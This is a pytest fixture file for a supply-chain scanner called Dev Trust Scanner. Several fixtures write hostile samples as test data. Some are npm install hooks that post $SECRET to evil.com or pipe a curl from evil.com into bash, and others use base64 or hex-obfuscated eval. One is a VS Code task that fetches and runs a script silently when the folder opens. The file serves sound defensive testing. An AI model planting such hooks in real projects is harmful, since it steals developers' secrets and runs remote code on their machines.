"""Shared pytest fixtures for Dev Trust Scanner tests."""

import json
from pathlib import Path

import pytest


@pytest.fixture
def malicious_npm_eval(tmp_path):
    """Package with eval in postinstall script."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "evil-pkg",
            "version": "1.0.0",
            "scripts": {
                "postinstall": 'node -e "eval(Buffer.from(\'bWFsaWNpb3Vz\', \'base64\').toString())"'
            },
        })
    )
    return tmp_path


@pytest.fixture
def malicious_npm_network(tmp_path):
    """Package with curl in preinstall script."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "exfil-pkg",
            "version": "1.0.0",
            "scripts": {"preinstall": "curl -X POST http://evil.com/exfil -d $SECRET"},
        })
    )
    return tmp_path


@pytest.fixture
def malicious_npm_obfuscated(tmp_path):
    """Package with obfuscated code."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "obfuscated-pkg",
            "version": "1.0.0",
            "scripts": {
                "install": r"node -e \"\x65\x76\x61\x6c(process.env.MALWARE)\""
            },
        })
    )
    return tmp_path


@pytest.fixture
def clean_npm_package(tmp_path):
    """Benign package with normal scripts."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "clean-pkg",
            "version": "1.0.0",
            "scripts": {"build": "tsc", "test": "jest", "lint": "eslint ."},
        })
    )
    return tmp_path


@pytest.fixture
def npm_monorepo(tmp_path):
    """Monorepo with multiple package.json files."""
    # Root package
    root_pkg = tmp_path / "package.json"
    root_pkg.write_text(
        json.dumps({"name": "monorepo", "workspaces": ["packages/*"]})
    )

    # Clean workspace package
    pkg1_dir = tmp_path / "packages" / "pkg1"
    pkg1_dir.mkdir(parents=True)
    (pkg1_dir / "package.json").write_text(
        json.dumps({"name": "pkg1", "scripts": {"test": "jest"}})
    )

    # Malicious workspace package
    pkg2_dir = tmp_path / "packages" / "pkg2"
    pkg2_dir.mkdir(parents=True)
    (pkg2_dir / "package.json").write_text(
        json.dumps({
            "name": "pkg2",
            "scripts": {"postinstall": "curl http://evil.com | bash"},
        })
    )

    return tmp_path


@pytest.fixture
def malformed_package_json(tmp_path):
    """Package.json with invalid JSON."""
    pkg = tmp_path / "package.json"
    pkg.write_text('{"name": "broken", "scripts": {')
    return tmp_path


# VS Code tasks fixtures
@pytest.fixture
def contagious_interview_task(tmp_path):
    """Realistic Contagious Interview attack (auto-executing malicious task)."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    tasks_file = vscode_dir / "tasks.json"
    tasks_file.write_text(
        json.dumps({
            "version": "2.0.0",
            "tasks": [{
                "label": "npm install",
                "type": "shell",
                "command": "node -e \"eval(Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaCB8IHNo','base64').toString())\"",
                "runOptions": {"runOn": "folderOpen"},
                "presentation": {"reveal": "never"},
            }],
        })
    )
    return tmp_path


@pytest.fixture
def clean_vscode_tasks(tmp_path):
    """Benign VS Code tasks."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    tasks_file = vscode_dir / "tasks.json"
    tasks_file.write_text(
        json.dumps({
            "version": "2.0.0",
            "tasks": [{"label": "build", "type": "shell", "command": "npm run build"}],
        })
    )
    return tmp_path


@pytest.fixture
def vscode_tasks_with_comments(tmp_path):
    """VS Code tasks.json with JSONC comments."""
    vscode_dir = tmp_path / ".vscode"
    vscode_dir.mkdir()
    tasks_file = vscode_dir / "tasks.json"
    tasks_file.write_text(
        '''
        {
            // Configuration version
            "version": "2.0.0",
            /* Task definitions */
            "tasks": [
                {
                    "label": "test", // Run tests
                    "command": "npm test"
                }
            ]
        }
        '''
    )
    return tmp_path
